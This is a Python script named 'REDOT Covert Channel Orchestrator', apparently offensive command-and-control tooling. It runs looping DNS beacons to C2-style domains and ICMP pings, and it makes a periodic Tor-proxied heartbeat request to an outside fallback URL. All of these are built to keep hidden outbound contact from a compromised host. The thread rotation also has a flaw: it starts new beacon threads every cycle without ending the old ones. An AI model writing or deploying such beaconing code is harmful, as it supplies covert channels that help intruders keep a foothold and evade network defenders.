#!/usr/bin/env python3
# REDOT: covert_channel_orchestrator.py

import subprocess
import os
import time
import random
import socket
from threading import Thread

DNS_DOMAINS = ["redot.dns.c2", "stealth.pivot.zone"]
ICMP_INTERVAL = 30
TOR_PROXY = "socks5h://127.0.0.1:9050"
FALLBACK_URL = "https://cdn.redot.live/heartbeat"

LOG_FILE = "logs/chan/beacons.log"
os.makedirs("logs/chan", exist_ok=True)

def log(msg):
    with open(LOG_FILE, "a") as f:
        f.write(f"[{time.strftime('%H:%M:%S')}] {msg}\n")
    print(msg)

def dns_beacon_loop():
    while True:
        domain = random.choice(DNS_DOMAINS)
        try:
            socket.gethostbyname(domain)
            log(f"[DNS] Beaconed domain: {domain}")
        except Exception:
            log(f"[DNS] Failed: {domain}")
        time.sleep(random.randint(20, 40))

def icmp_beacon_loop():
    while True:
        try:
            subprocess.run(["ping", "-c", "1", "8.8.8.8"], stdout=subprocess.DEVNULL)
            log("[ICMP] Sent ping to 8.8.8.8")
        except Exception:
            log("[ICMP] Ping failed")
        time.sleep(ICMP_INTERVAL)

def tor_fallback():
    try:
        import requests
        proxies = {"http": TOR_PROXY, "https": TOR_PROXY}
        r = requests.get(FALLBACK_URL, proxies=proxies, timeout=10)
        if r.status_code == 200:
            log("[TOR] Fallback communication successful")
    except Exception:
        log("[TOR] Fallback failed")

def rotate_channels():
    while True:
        dns_beacon_loop_thread = Thread(target=dns_beacon_loop, daemon=True)
        icmp_beacon_loop_thread = Thread(target=icmp_beacon_loop, daemon=True)

        dns_beacon_loop_thread.start()
        icmp_beacon_loop_thread.start()

        time.sleep(180)
        tor_fallback()

def main():
    print("=== REDOT Covert Channel Orchestrator ===")
    rotate_channels()

if __name__ == "__main__":
    main()
